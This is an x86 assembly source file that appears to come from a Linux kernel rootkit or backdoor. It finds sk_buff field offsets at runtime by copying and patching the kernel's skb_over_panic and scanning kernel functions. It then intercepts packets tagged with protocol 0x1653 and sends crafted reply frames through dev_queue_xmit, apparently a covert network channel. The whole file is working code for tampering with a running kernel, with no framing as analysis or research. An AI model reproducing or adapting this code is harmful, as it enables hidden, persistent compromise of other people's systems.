sk_buff.len: .fill 4
sk_buff.data: .fill 4
sk_buff.tail: .fill 4
sk_buff.protocol: .fill 4
sk_buff.end: .fill 4
sk_buff.dev: .fill 4
sk_buff.users: .fill 4
net_device.hard_start_xmit: .fill 4


data_recv: .fill 4

fake_skb_over_panic:
/* we will copy the true skb_over_panic here, and change
	'call printk(...)' to 'jmp fake_get_skb_offsets'
*/
	.fill 0x100


fake_struct_sk_buff:
/* the content of this struct is:
	00 01 02 03 ... 
	easy to locate offsets :)
*/
	.fill 0x140

fake_get_skb_offsets:
/*
	void skb_over_panic(struct sk_buff *skb, int sz, void *here)
	{
		printk(KERN_EMERG "skb_over_panic: text:%p len:%d put:%d head:%p "
						  "data:%p tail:%p end:%p dev:%s\n",
			   here, skb->len, sz, skb->head, skb->data, skb->tail, skb->end,
			   skb->dev ? skb->dev->name : "<NULL>");
		BUG();
	}

	now, we want to fake printk. so:
	skb->len = 0x8(%esp)
	skb->head = 0x10(%esp)
	skb->data = 0x14(%esp)
	skb->tail = 0x18(%esp)
	skb->end = 0x1c(%esp)
	skb->dev = 0x20(%esp)
*/	

	movl 0x8(%esp), %ebx
	andl $0xff, %ebx
	SET_VAL32(sk_buff.len, %ebx)
	
	movl 0x14(%esp), %ebx
	andl $0xff, %ebx
	SET_VAL32(sk_buff.data, %ebx)
	
	movl 0x18(%esp), %ebx
	andl $0xff, %ebx
	SET_VAL32(sk_buff.tail, %ebx)

	movl 0x1c(%esp), %ebx
	andl $0xff, %ebx
	SET_VAL32(sk_buff.end, %ebx)

	movl 0x20(%esp), %ebx
	andl $0xff, %ebx
	SET_VAL32(sk_buff.dev, %ebx)

	jmp fake_get_skb_offsets_ret



/* void skb_init(); */
/* find the offsets of skb */
skb_init:

#define addr_call 0x8
#define retcode 0x24
	PUSH_ALL
    subl $0x2c, %esp 

	GET_ADDR(fake_struct_sk_buff, %edi)
	xorl %ecx, %ecx
1:	movb %cl, (%edi)
	incl %edi
	incl %ecx
	cmpl $0x100, %ecx
	jl 1b
	// fill fake sk_buff

	GET_VAL32(skb_over_panic, %esi)
	GET_ADDR(fake_skb_over_panic, %edi)
	movl $0x100, %ecx
	cld; rep movsb

	GET_ADDR(fake_skb_over_panic, %eax)
	leal 0x100(%eax), %edi
	movl %eax, %esi
	movl $0, addr_call(%esp)
1:	movl %esi, %eax
	GET_ADDR(struct_dism, %edx)
	call xde_dism
	testl %eax, %eax
	jz skb_init_out	
	movl %eax, %ebp
	
	cmpb $0xe8, dism_opcode(%edx)
	jz 3f
	cmpb $0x83, dism_opcode(%edx)
	jz 6f
	movb dism_opcode(%edx), %al
	andb $0x50, %al
	cmpb $0x50, %al
	jnz 2f
	cmpl $1, dism_len(%edx)
	jz 7f

2:	addl %ebp, %esi
	cmpl %edi, %esi
	jl 1b
	jmp 5f
	
3:	// meet call printk(...
	cmpl $0, addr_call(%esp)
	jnz 2b
	movl %esi, addr_call(%esp)

#ifdef _DEBUG_
	movl %esi, 4(%esp)
	DPRINT("meet printk at %lx\n")
#endif

	jmp 2b

6:	// meet sub $xx, %esp; fuck it !!; fill it with 'nop'
	movw $0x9090, (%esi)
	movb $0x90, 2(%esi)
	jmp 2b

7:	// meet push xxx; fuck it too !!
	movb $0x90, (%esi)
	jmp 2b

5:	

#ifdef _DEBUG_
	DPRINT("finish.\n")
#endif

	GET_ADDR(fake_get_skb_offsets, %eax)
	movl addr_call(%esp), %ebx
	addl $5, %ebx
	subl %ebx, %eax
	movl %eax, -4(%ebx)
	movb $0xe9, -5(%ebx)

	subl $0x40, %esp
	GET_ADDR(fake_struct_sk_buff, %eax)
	jmp fake_skb_over_panic

fake_get_skb_offsets_ret:
	addl $0x40, %esp


	// get sk_buff.protocol
	GET_VAL32(skb_gso_segment, %eax)
	movl %eax, (%esp)
	movl $0x100, 0x4(%esp)
	call 1f
	.byte 0x00; .long 0x0000ffff; .long 0x0000b70f 
	.byte 's'; .byte 0x03; .long 0x000000ff
	.byte 'e'
1:	popl %eax
	movl %eax, 0x8(%esp)
	leal 0x10(%esp), %eax
	movl %eax, 0xc(%esp)
	call xde_find
	testl %eax, %eax
	jz skb_init_out
	movl 0x10(%esp), %ebx
	SET_VAL32(sk_buff.protocol, %ebx)


	// get sk_buff.users
	GET_VAL32(kfree_skb, %eax)
	movl %eax, (%esp)
	movl $0x50, 0x4(%esp)
	call 1f
	.byte 0x00; .long 0x000000ff; .long 0x00000083
	.byte 's'; .byte 0x02; .long 0x000000ff
	.byte 'e'
1:	popl %eax
	movl %eax, 0x8(%esp)
	leal 0x10(%esp), %eax
	movl %eax, 0xc(%esp)
	call xde_find
	testl %eax, %eax
	jz skb_init_out
	movl 0x10(%esp), %ebx
	SET_VAL32(sk_buff.users, %ebx)

#ifdef _DEBUG_
	GET_VAL32(sk_buff.len, %eax)
	movl %eax, 0x4(%esp)
	GET_VAL32(sk_buff.data, %eax)
	movl %eax, 0x8(%esp)
	GET_VAL32(sk_buff.tail, %eax)
	movl %eax, 0xc(%esp)
	GET_VAL32(sk_buff.end, %eax)
	movl %eax, 0xc(%esp)
	GET_VAL32(sk_buff.dev, %eax)
	movl %eax, 0x14(%esp)
	GET_VAL32(sk_buff.protocol, %eax)
	movl %eax, 0x18(%esp)
	GET_VAL32(sk_buff.users, %eax)
	movl %eax, 0x1c(%esp)
	DPRINT("<3>skb_buff len %lx, data %lx, tail %lx, end %lx, dev %lx, protocol %lx, users %lx\n")
#endif
	
	movl $1, %eax
3:	
skb_init_out:
    addl $0x2c, %esp 
    POP_ALL

#undef addr_call
#undef retcode


/* void handle incoming skb(); */
handle_incoming_skb:
	PUSH_ALL
	movl %eax, %esi
	subl $0x10, %esp

	GET_ADDR(sk_buff.protocol, %ebx)
	movl %esi, %ecx
	addl (%ebx), %ecx
	movzwl (%ecx), %ecx

	cmpl $0x1653, %ecx
	jnz his_out
	// if (skb->protocol != 0x1653)
	//	return;

	GET_STRUCT_VAL32(%esi, sk_buff.end, %ebx)
	movzwl 4(%ebx), %ecx

	testl %ecx, %ecx
	jz 1f

	// when skb_shinfo(skb)->nrfrags > 0
#ifdef _DEBUG_
	movl %ecx, 4(%esp)
	DPRINT("<3>our pack: nrfrags %lx\n")
#endif

1:	// when skb_shinfo(skb)->nrfrags == 0

	// data_recv = __kmalloc(skb->len + 8, GFP_ATOMIC);
	GET_STRUCT_VAL32(%esi, sk_buff.len, %ecx)
	movl %ecx, %edi
	leal 8(%ecx), %eax
	movl $0x20, %edx
	GET_VAL32(__kmalloc, %ebp)
	call *%ebp
	testl %eax, %eax
	jz his_out
	movl %eax, %ebx
	SET_VAL32(data_recv, %ebx)

	// put skb->len, skb->dev at the begining of data_recv
	movl %edi, (%ebx)
	GET_STRUCT_VAL32(%esi, sk_buff.dev, %eax)
	movl %eax, 4(%ebx)

	// memcpy(data_recv + 8, skb->data - 14, skb->len);
	movl %edi, %ecx
	leal 8(%ebx), %edi
	GET_STRUCT_VAL32(%esi, sk_buff.data, %ebx)
	leal -14(%ebx), %esi
	cld; rep movsb

	// struct_work_struct.func = thread_recv;
	GET_ADDR(thread_recv, %ebx)
	GET_ADDR(struct_work_struct, %ecx)
	SET_STRUCT_VAL32(%ecx, work_struct.func, %ebx)

	// schedule_work(struct_work_struct);
	GET_VAL32(schedule_work, %ebp)
	movl %ecx, %eax
	call *%ebp

his_out:
	addl $0x10, %esp
	POP_ALL
	ret


// void thread_recv(void *data_recv);
thread_recv:
	PUSH_ALL
	subl $0x10, %esp

#ifdef _DEBUG_
	DPRINT("<3>our pack\n")
#endif

	// skb = __netdev_alloc_skb(dev, 123, GFP_ATOMIC);
	GET_VAL32(data_recv, %eax)
	leal 0x8(%eax), %edi
	movl $123, %edx
	movl 4(%eax), %eax
	movl $0x20, %ecx
	GET_VAL32(__netdev_alloc_skb, %ebp)
	call *%ebp
	testl %eax, %eax
	jz thread_recv_out
	movl %eax, %esi

	// skb->len = 123;
	SET_STRUCT_VAL32(%esi, sk_buff.len, $123)

	// skb->tail = skb->end;
	GET_STRUCT_VAL32(%esi, sk_buff.end, %ebx)
	SET_STRUCT_VAL32(%esi, sk_buff.tail, %ebx)

	// memcpy(skb->data, data_recv + 0x8 + 6, 6);
	GET_STRUCT_VAL32(%esi, sk_buff.data, %eax)
	movl 6(%edi), %ebx
	movw 10(%edi), %cx
	movl %ebx, (%eax)
	movw %cx, 4(%eax)

	// memcpy(skb->data + 6, data_recv + 0x8, 6);
	movl (%edi), %ebx
	movw 4(%edi), %cx
	movl %ebx, 6(%eax)
	movw %cx, 10(%eax)
	
	// memcpy(skb->data + 14, "\x12\x34\x56\x78", 4);
	movl $0x12345678, 14(%eax)

	// dev_queue_xmit(skb);
	GET_VAL32(dev_queue_xmit, %ebp)
	movl %esi, %eax
	call *%ebp

#ifdef _DEBUG_
	movl %eax, 4(%esp)
	DPRINT("<3>sent %lx\n")
#endif

thread_recv_out:
	addl $0x10, %esp
	POP_ALL
	ret

